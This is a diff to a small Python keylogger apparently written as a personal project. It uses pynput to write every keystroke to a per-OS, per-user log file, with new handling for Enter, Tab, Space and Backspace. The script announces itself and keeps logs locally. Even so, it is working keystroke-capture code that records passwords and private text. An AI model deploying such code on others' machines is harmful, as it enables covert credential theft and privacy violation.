@@ -1,23 +1,29 @@
 #!/usr/bin/env python3
 #
-# Keylogger coded by Jonathan Houle
-# 20 Oct. 2022
+# Basic Keylogger V1
+# Coded by Jonathan Houle
+# September, 2024
 
+import platform
 from pynput import keyboard
 from pathlib import Path
 import getpass
 from datetime import datetime
 
 # Constants for creating the text file
-CURRENT_OS_USER = getpass.getuser()
+CURRENT_OS_NAME = platform.system()
+CURRENT_OS_VERSION = platform.release()
+CURRENT_OS_CURRENT_USER = getpass.getuser()
 CURRENT_TIME_OBJECT = datetime.now()
 CURRENT_TIME_STRING = CURRENT_TIME_OBJECT.strftime("%d-%b-%Y-%H:%M:%S")
 
-REPERTORY_FOR_LOGS = "./logs/" + CURRENT_OS_USER + "/"
-FILENAME = "keylogger_" + CURRENT_TIME_STRING
+REPERTORY_FOR_LOGS = "./logs/" + CURRENT_OS_NAME + "/" + CURRENT_OS_CURRENT_USER + "/"
+FILENAME = "keylogger_" + CURRENT_TIME_STRING + ".txt"
 
 # Starting message
 print("Keylogger activated.\nEverything will be saved in the folder logs under the name of :\n" + REPERTORY_FOR_LOGS + FILENAME)
+print("OS: " + CURRENT_OS_NAME)
+print("Version: " + CURRENT_OS_VERSION)
 
 # Creating folder for logs if it does not exist and creating the text file
 Path(REPERTORY_FOR_LOGS).mkdir(parents=True, exist_ok=True)
@@ -28,7 +34,24 @@ def on_pressing_key(key):
     try:
         print("{0}".format(key))
         if(key != keyboard.Key.esc):
-            file.write("{0}".format(key))
+            match key: 
+                # If Return or Tab is pressed, we want to add a line to the text file
+                case keyboard.Key.enter:
+                    file.write("\n")
+                case keyboard.Key.tab:
+                    file.write("\n")
+                # If Space is pressed, we want to add a space to the text file
+                case keyboard.Key.space:
+                    file.write(" ")
+                # If Backspace is pressed, we want to delete the last character from the file
+                case keyboard.Key.backspace:
+                    file.seek(-1, 2) 
+                    file.truncate()
+                # Anything else is printed normally
+                case _:
+                    k = str(key).replace("'", "")
+                    file.write("{0}".format(k))
+                
 
     except AttributeError:
         print("{0}".format(key))
